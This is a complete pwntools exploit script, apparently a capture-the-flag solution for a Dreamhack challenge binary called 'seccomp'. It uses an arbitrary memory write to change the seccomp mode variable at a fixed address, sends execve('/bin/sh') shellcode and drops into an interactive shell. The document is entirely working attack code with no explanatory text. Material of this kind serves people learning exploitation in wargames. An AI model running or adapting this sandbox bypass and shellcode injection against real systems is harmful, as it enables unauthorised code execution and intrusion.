#! /usr/bin/env python3
# Name: bypass_seccomp.py

from pwn import *
context.arch = 'x86_64'

p = process('./seccomp')
# p = remote('host3.dreamhack.games', 9002)
mode = 0x0000000000602090

# sh = shellcraft.sh()
sh = shellcraft.execve('/bin/sh', 0, 0)
p.sendlineafter('>', b'3')

p.sendlineafter('addr: ', str(mode))
p.sendlineafter('value: ', b'2')

p.sendlineafter('>', b'1')

p.sendlineafter('shellcode: ', asm(sh))

p.sendlineafter('>', b'2')

p.interactive()
